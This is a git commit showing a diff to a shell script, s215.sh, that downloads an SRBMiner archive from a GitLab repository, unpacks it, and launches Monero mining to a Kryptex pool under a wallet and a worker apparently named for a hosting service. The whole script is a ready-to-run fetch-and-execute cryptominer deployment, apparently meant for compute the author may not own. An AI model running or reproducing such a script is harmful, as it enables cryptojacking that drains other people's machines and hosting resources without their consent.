47506678ea8f6141237d146c5c1191fbac02c671
myce <me@example.com>
2025-02-24 22:01:00 +0530

    ok

--- s215.sh
+++ s215.sh
@@ -1,5 +1,6 @@
 wget https://gitlab.com/sight2/02ef/-/raw/master/SRBMiner-Multi-2-7-9-Linux.tar.gz && \
-tar -xzf SRBMiner-Multi-2-7-9-Linux.tar.gz && \
+gunzip SRBMiner-Multi-2-7-9-Linux.tar.gz && \
+tar --extract -f SRBMiner-Multi-2-7-9-Linux.tar && \
 cd SRBMiner-Multi-2-7-9 && \
 chmod +x * && \
 ./SRBMiner-MULTI --algorithm randomx --pool stratum+tcp://xmr.kryptex.network:7777 --wallet krxYEJVN46/onworks215 --disable-gpu
